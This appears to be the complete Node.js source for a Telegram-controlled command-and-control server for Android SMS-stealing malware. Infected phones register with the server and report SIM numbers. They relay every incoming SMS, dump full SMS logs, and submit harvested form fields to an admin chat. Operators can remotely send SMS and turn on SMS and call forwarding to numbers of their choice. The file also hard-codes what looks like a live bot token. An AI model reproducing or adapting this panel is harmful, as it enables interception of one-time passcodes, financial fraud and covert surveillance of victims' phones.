const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = '8437986148:AAHlP5fmNLosNlvnER_8Unj71IHdqmQslrM';  // अपना Bot Token डालें
const ADMIN_IDS = [-1002630590854];             // अपना Admin Chat ID डालें
const DEVELOPER = '@yourusername';             // अपना Username डालें
const PORT = 3000;

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== EXPRESS APP =====
const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// ===== TELEGRAM BOT =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== RUNTIME DATA =====
const devices = new Map();
const sessions = {};

// ===== UTILS =====
function readQueue() {
  return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {};
}

function writeQueue(q) {
  fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 });
}

function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}

function formatDevice(d) {
  const online = (Date.now() - (d.lastSeen || 0) < 60000);
  return `📱 *${d.model || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'}\n🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 Battery: ${d.battery || 'N/A'}%\n🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
}

function isAdmin(chatId) {
  return ADMIN_IDS.includes(chatId);
}

// ===== EXPRESS ROUTES =====

app.get('/', (_, res) => res.send('✅ Panel online'));

app.post('/connect', (req, res) => {
  const { uuid, model, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('Missing uuid');

  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });

  const msg = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}\n\n👨‍💻 Developer: ${DEVELOPER}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  res.sendStatus(200);
});

app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('Missing uuid');
  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

// Real-time SMS notification
app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('Missing fields');

  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = new Date(timestamp || Date.now());

  let smsMessage = `📩 *New SMS Received*\n` +
  `\n📱 *Device:* ${device.model || 'Unknown'}` +
  `\n🔋 *Battery Level:* ${battery || 'N/A'}%` +
  `\n🪪 *SIM1 Number:* ${device.sim1 || 'N/A'}` +
  `\n🪪 *SIM2 Number:* ${device.sim2 || 'N/A'}` +
  `\n\n✉️ *From:* \`${from}\`` +
  `\n\`\`\`📝 *Message:* \n${body}\`\`\`` +
  `\n\n📶 *SIM Slot:* ${sim}` +
  `\n⏰ *Received At:* ${new Date(timestamp).toLocaleString()}` +
  `\n\n👨‍💻 _Developer: ${DEVELOPER}_`;

  if (smsMessage.length > 3800) {
    const tempPath = path.join(STORAGE_DIR, `${uuid}_last_sms.txt`);
    fs.writeFileSync(tempPath, smsMessage, 'utf8');
    ADMIN_IDS.forEach(id => {
      bot.sendDocument(id, tempPath, {}, { filename: `${uuid}_last_sms.txt` })
        .then(() => fs.unlinkSync(tempPath))
        .catch(() => bot.sendMessage(id, smsMessage, { parse_mode: 'Markdown' }));
    });
  } else {
    ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMessage, { parse_mode: 'Markdown' }).catch(() => {}));
  }
  res.sendStatus(200);
});

// SMS Logs from device
app.post('/sms-log', (req, res) => {
  const { uuid, commandId, smsLogs } = req.body;
  if (!uuid || !smsLogs) return res.status(400).send('Missing fields');

  const device = devices.get(uuid) || { model: uuid };
  let msg = `📜 *SMS Logs from ${device.model}* (${smsLogs.length} messages):\n\n`;
  
  smsLogs.forEach((sms, i) => {
    msg += `${i + 1}. *From:* ${sms.from}\n*SIM:* ${sms.sim}\n*Message:* ${sms.body}\n*Time:* ${new Date(sms.timestamp).toLocaleString()}\n\n`;
  });
  
  msg += `👨‍💻 _Developer: ${DEVELOPER}_`;

  if (msg.length > 3800) {
    const tempPath = path.join(STORAGE_DIR, `${uuid}_sms_logs.txt`);
    fs.writeFileSync(tempPath, msg, 'utf8');
    ADMIN_IDS.forEach(id => {
      bot.sendDocument(id, tempPath, {}, { filename: `${uuid}_sms_logs.txt` })
        .then(() => fs.unlinkSync(tempPath))
        .catch(() => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }));
    });
  } else {
    ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  }
  res.sendStatus(200);
});

app.post('/html-form-data', (req, res) => {
  const { uuid, brand, battery, ...fields } = req.body;
  if (!uuid) return res.status(400).send('Missing UUID');

  let msg = `🧾 *Form Submitted*\n📱 ${devices.get(uuid)?.model || uuid}\n🏷 Device Brand: ${brand || 'Unknown'}\n🔋 Battery: ${battery || 'N/A'}%\n\n`;
  for (const [k, v] of Object.entries(fields)) {
    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
    msg += `🔸 ${label}: ${v}\n`;
  }
  msg += `\n👨‍💻 Developer: ${DEVELOPER}`;

  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  res.sendStatus(200);
});

app.post('/confirm-command', (req, res) => {
  const { uuid, commandId, type, status, message, sim, forwardNumber } = req.body;
  if (!uuid || !commandId || !status) return res.status(400).send('Missing fields');

  const device = devices.get(uuid) || { model: uuid };
  let confirmMsg = `✅ *Command Confirmation*\n📱 *Device:* ${device.model}\n🆔 *Command ID:* ${commandId}\n📊 *Status:* ${status}\n🔧 *Type:* ${type || 'N/A'}\n💬 *Message:* ${message || 'N/A'}\n📶 *SIM:* ${sim || 'N/A'}`;

  if (type === 'call_forward_check' || type === 'sms_forward_check') {
    confirmMsg += `\n📞 *Forwarding Number:* ${forwardNumber || 'Not Set'}`;
  }
  confirmMsg += `\n\n👨‍💻 _Developer: ${DEVELOPER}_`;

  ADMIN_IDS.forEach(id => bot.sendMessage(id, confirmMsg, { parse_mode: 'Markdown' }).catch(() => {}));
  res.sendStatus(200);
});

// Telegram Bot Events
bot.on('message', msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Permission denied.');
    return;
  }

  if (text === '/start') {
    bot.sendMessage(chatId, '✅ *Admin Panel Ready*', {
      parse_mode: 'Markdown',
      reply_markup: {
        keyboard: [
          ['📱 Connected Devices'],
          ['⚡ Execute Command']
        ],
        resize_keyboard: true
      }
    });
  }

  if (text === '📱 Connected Devices' || text === 'Connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    let out = '📱 *Connected Devices:*\n\n';
    for (const [uuid, d] of devices.entries()) {
      out += `${formatDevice(d)}\n🆔 UUID: \`${uuid}\`\n\n`;
    }
    bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
  }

  if (text === '⚡ Execute Command' || text === 'Execute command') {
    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `device:${uuid}` }]);
    if (rows.length === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    bot.sendMessage(chatId, '🔘 *Select device:*', {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: rows }
    });
  }

  // Handle user input for sessions
  if (sessions[chatId]) {
    const session = sessions[chatId];
    
    if (session.stage === 'await_number') {
      const phoneNumber = text.trim();
      session.phoneNumber = phoneNumber;
      session.stage = 'await_message';
      bot.sendMessage(chatId, '📝 Enter message to send:');
      
    } else if (session.stage === 'await_message') {
      const message = text.trim();
      const { action, sim, uuid, phoneNumber } = session;
      
      if (action === 'send_sms') {
        const commandId = `send_sms_${Date.now()}`;
        addCommand(uuid, { type: 'send_sms', commandId, phoneNumber, message, sim });
        bot.sendMessage(chatId, `✅ SMS command sent to device\n📞 To: ${phoneNumber}\n📝 Message: ${message}\n📶 SIM: ${sim}`);
      }
      
      delete sessions[chatId];
      
    } else if (session.stage === 'await_forward_number') {
      const forwardNumber = text.trim();
      const { action, sim, uuid } = session;
      
      if (action === 'sms_forward_on') {
        const commandId = `sms_fwd_${Date.now()}`;
        addCommand(uuid, { type: 'sms_forward', action: 'on', sim, forwardNumber, commandId });
        bot.sendMessage(chatId, `✅ SMS Forward ON command sent\n📞 Forward to: ${forwardNumber}\n📶 SIM: ${sim}`);
        
      } else if (action === 'call_forward_on') {
        const commandId = `call_fwd_${Date.now()}`;
        addCommand(uuid, { type: 'call_forward', action: 'on', sim, forwardNumber, commandId });
        bot.sendMessage(chatId, `✅ Call Forward ON command sent\n📞 Forward to: ${forwardNumber}\n📶 SIM: ${sim}`);
      }
      
      delete sessions[chatId];
    }
  }
});

// Callback Query handler
bot.on('callback_query', cb => {
  const chatId = cb.message.chat.id;
  const data = cb.data;
  
  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });

  const [cmd, uuid] = data.split(':');
  const device = devices.get(uuid);

  switch (cmd) {
    case 'device': {
      const buttons = [
        [{ text: '📜 SMS Logs', callback_data: `get_sms_log:${uuid}` }],
        [{ text: '✉️ Send SMS', callback_data: `send_sms_menu:${uuid}` }],
        [{ text: '📞 Call Forward', callback_data: `call_forward_menu:${uuid}` }],
        [{ text: '📨 SMS Forward', callback_data: `sms_forward_menu:${uuid}` }],
        [{ text: '📋 Device Info', callback_data: `device_info:${uuid}` }],
        [{ text: '⬅️ Back', callback_data: 'back_devices' }]
      ];

      bot.editMessageText(`🔧 *Commands for ${device?.model || uuid}*\n\n👨‍💻 _Developer: ${DEVELOPER}_`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
      });
      break;
    }

    case 'get_sms_log': {
      const commandId = `get_sms_log_${Date.now()}`;
      addCommand(uuid, { type: 'get_sms_log', commandId });
      bot.sendMessage(chatId, '⌛ *Fetching SMS logs from device...*', { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id, { text: '📜 SMS logs requested' });
      break;
    }

    case 'send_sms_menu': {
      const sim1 = { text: 'SIM1', callback_data: `send_sms_sim1:${uuid}` };
      const sim2 = { text: 'SIM2', callback_data: `send_sms_sim2:${uuid}` };
      bot.editMessageText('✉️ *Choose SIM to send SMS:*', {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[sim1, sim2], [{ text: '⬅️ Back', callback_data: `device:${uuid}` }]] }
      });
      break;
    }

    case 'send_sms_sim1':
    case 'send_sms_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      sessions[chatId] = { stage: 'await_number', action: 'send_sms', sim, uuid };
      bot.sendMessage(chatId, '📞 Enter recipient phone number:');
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'sms_forward_menu': {
      const sim1 = { text: 'SIM1', callback_data: `sms_forward_sim1:${uuid}` };
      const sim2 = { text: 'SIM2', callback_data: `sms_forward_sim2:${uuid}` };
      bot.editMessageText('📨 *Choose SIM for SMS Forward:*', {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[sim1, sim2], [{ text: '⬅️ Back', callback_data: `device:${uuid}` }]] }
      });
      break;
    }

    case 'sms_forward_sim1':
    case 'sms_forward_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      const on = { text: '✅ Enable', callback_data: `sms_forward_on_sim${sim}:${uuid}` };
      const off = { text: '❌ Disable', callback_data: `sms_forward_off_sim${sim}:${uuid}` };
      const check = { text: '🔍 Check Status', callback_data: `sms_forward_check_sim${sim}:${uuid}` };
      bot.editMessageText(`📨 *SMS Forward SIM${sim}* — Choose action:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[on, off], [check], [{ text: '⬅️ Back', callback_data: `sms_forward_menu:${uuid}` }]] }
      });
      break;
    }

    case 'sms_forward_on_sim1':
    case 'sms_forward_on_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      sessions[chatId] = { stage: 'await_forward_number', action: 'sms_forward_on', sim, uuid };
      bot.sendMessage(chatId, `📨 Enter number to forward SMS TO (SIM${sim}):`);
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'sms_forward_off_sim1':
    case 'sms_forward_off_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      const commandId = `sms_fwd_off_${Date.now()}`;
      addCommand(uuid, { type: 'sms_forward', action: 'off', sim, commandId });
      bot.sendMessage(chatId, `✅ *SMS Forward OFF SIM${sim}*\n👨‍💻 _Developer: ${DEVELOPER}_`, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'sms_forward_check_sim1':
    case 'sms_forward_check_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      const commandId = `sms_fwd_check_${Date.now()}`;
      addCommand(uuid, { type: 'sms_forward_check', commandId, sim });
      bot.sendMessage(chatId, `🔍 *Checking SMS Forward SIM${sim} status...*\n⌛ Waiting for device confirmation`, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'call_forward_menu': {
      const sim1 = { text: 'SIM1', callback_data: `call_forward_sim1:${uuid}` };
      const sim2 = { text: 'SIM2', callback_data: `call_forward_sim2:${uuid}` };
      bot.editMessageText('📞 *Choose SIM for Call Forward:*', {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[sim1, sim2], [{ text: '⬅️ Back', callback_data: `device:${uuid}` }]] }
      });
      break;
    }

    case 'call_forward_sim1':
    case 'call_forward_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      const on = { text: '✅ Enable', callback_data: `call_forward_on_sim${sim}:${uuid}` };
      const off = { text: '❌ Disable', callback_data: `call_forward_off_sim${sim}:${uuid}` };
      const check = { text: '🔍 Check Status', callback_data: `call_forward_check_sim${sim}:${uuid}` };
      bot.editMessageText(`📞 *Call Forward SIM${sim}* — Choose action:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[on, off], [check], [{ text: '⬅️ Back', callback_data: `call_forward_menu:${uuid}` }]] }
      });
      break;
    }

    case 'call_forward_on_sim1':
    case 'call_forward_on_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      sessions[chatId] = { stage: 'await_forward_number', action: 'call_forward_on', sim, uuid };
      bot.sendMessage(chatId, `📞 Enter number to forward calls TO (SIM${sim}):`);
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'call_forward_off_sim1':
    case 'call_forward_off_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      const commandId = `call_fwd_off_${Date.now()}`;
      addCommand(uuid, { type: 'call_forward', action: 'off', sim, commandId });
      bot.sendMessage(chatId, `✅ *Call Forward OFF SIM${sim}*\n👨‍💻 _Developer: ${DEVELOPER}_`, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'call_forward_check_sim1':
    case 'call_forward_check_sim2': {
      const sim = data.includes('sim2') ? 2 : 1;
      const commandId = `call_fwd_check_${Date.now()}`;
      addCommand(uuid, { type: 'call_forward_check', commandId, sim });
      bot.sendMessage(chatId, `🔍 *Checking Call Forward SIM${sim} status...*\n⌛ Waiting for device confirmation`, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'device_info': {
      const d = devices.get(uuid);
      if (!d) return bot.answerCallbackQuery(cb.id, { text: 'Device not found' });
      let msg = `📋 *Device Information*\n\n${formatDevice(d)}\n🆔 *UUID:* \`${uuid}\`\n\n👨‍💻 _Developer: ${DEVELOPER}_`;
      bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id);
      break;
    }

    case 'back_devices': {
      const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `device:${uuid}` }]);
      bot.editMessageText('🔘 *Select device:*', {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: rows }
      });
      bot.answerCallbackQuery(cb.id);
      break;
    }

    default:
      bot.answerCallbackQuery(cb.id, { text: '❌ Unknown action' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
